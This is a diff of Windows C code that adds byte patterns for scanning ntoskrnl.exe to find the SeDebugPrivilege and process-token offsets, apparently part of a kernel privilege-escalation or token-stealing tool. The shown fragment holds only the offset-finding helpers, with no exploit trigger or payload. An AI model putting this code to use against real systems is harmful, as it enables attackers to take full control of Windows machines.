@@ -9,9 +9,11 @@ LPCWSTR wCmdPath = L"C:\\Windows\\System32\\cmd.exe";
 LPCSTR CmdPath = "C:\\Windows\\System32\\cmd.exe";
 LPCWSTR wNtoPath = L"C:\\Windows\\System32\\ntoskrnl.exe";
 LPCSTR NtoPath = "C:\\Windows\\System32\\ntoskrnl.exe";
+//LPCWSTR NtoPath = L"\\SystemRoot\\system32\\ntoskrnl.exe";
 
 LPCWSTR wNtoRootPath = L"\\SystemRoot\\system32\\ntoskrnl.exe";
 LPCSTR NtoRootPath = "\\SystemRoot\\system32\\ntoskrnl.exe";
+
 
 void ErrorStatusInfo(LPCSTR ErrorMsg, int error)
 {
@@ -454,13 +456,26 @@ UINT_PTR FindSeDebugPrivilegeOffset(HMODULE hModule)
 UINT_PTR FindTokenOffset(HMODULE hModule)
 {
     // 下面的字节序列在 PspSetQuotaLimits 函数中，WS2008-WS2025 都有
+    BYTE pattern0[] = {
+        0x48, 0x8B, 0xD8,
+        0x4C, 0x8B, 0xC0,
+        0x48, 0x8B
+    };
     BYTE pattern[] = {
         0x48, 0x8B, 0xD8,
         0x4C, 0x8B, 0xC0,
         0x48, 0x8B, 0xD7,
         0x48, 0x8D, 0x4C
     };
+    BYTE pattern2[] = {
+        0x48, 0x8B, 0xD8,
+        0x4C, 0x8B, 0xC0,
+        0x48, 0x8B, 0xD6,
+        0x48, 0x8D, 0x4C
+    };
+    SIZE_T patternSize0 = sizeof(pattern0);
     SIZE_T patternSize = sizeof(pattern);
+    SIZE_T patternSize2 = sizeof(pattern2);
 
     // 48 8B D8 mov     rbx, rax
     UINT_PTR MOV_RBX_RAX = 0;
@@ -481,7 +496,7 @@ UINT_PTR FindTokenOffset(HMODULE hModule)
             SIZE_T dwSectionSize = pSectionHeader[i].Misc.VirtualSize;
 
             if (ScanSectionForPattern(hCurrentProc,
-                lpSectionBaseAddress, dwSectionSize, pattern, patternSize, &lpFoundAddress)) {
+                lpSectionBaseAddress, dwSectionSize, pattern0, patternSize0, &lpFoundAddress)) {
                 // MOV_RBX_RAX 实际地址
                 MOV_RBX_RAX = (UINT_PTR)lpFoundAddress;
             }
